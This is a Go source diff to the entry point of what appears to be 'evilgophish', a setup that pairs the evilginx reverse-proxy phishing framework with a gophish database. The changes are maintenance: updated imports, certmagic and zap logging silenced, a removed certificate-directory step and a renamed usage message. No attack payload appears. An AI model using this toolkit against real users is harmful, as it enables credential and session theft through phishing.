@@ -3,15 +3,17 @@ package main
 import (
 	"flag"
 	"fmt"
-	"io/ioutil"
+	_log "log"
 	"os"
 	"os/user"
 	"path/filepath"
 	"regexp"
 
+	"github.com/caddyserver/certmagic"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+	"go.uber.org/zap"
 
 	"github.com/fatih/color"
 )
@@ -46,7 +48,7 @@ func showAd() {
 func main() {
 	flag.Parse()
 	if *gophish_db == "" {
-		log.Fatal("you need to provide the full path to the gophish database: ./evilginx2 -g /opt/evilgophish/gophish/gophish.db")
+		log.Fatal("you need to provide the full path to the gophish database: ./evilginx3 -g /opt/evilgophish/gophish/gophish.db")
 		return
 	}
 
@@ -60,6 +62,10 @@ func main() {
 
 	core.Banner()
 	showAd()
+
+	_log.SetOutput(log.NullLogger().Writer())
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
 
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
@@ -116,11 +122,6 @@ func main() {
 
 	crt_path := joinPath(*cfg_dir, "./crt")
 
-	if err := core.CreateDir(crt_path, 0700); err != nil {
-		log.Fatal("mkdir: %v", err)
-		return
-	}
-
 	cfg, err := core.NewConfig(*cfg_dir, "")
 	if err != nil {
 		log.Fatal("config: %v", err)
@@ -146,7 +147,7 @@ func main() {
 		return
 	}
 
-	files, err := ioutil.ReadDir(phishlets_path)
+	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
 		return
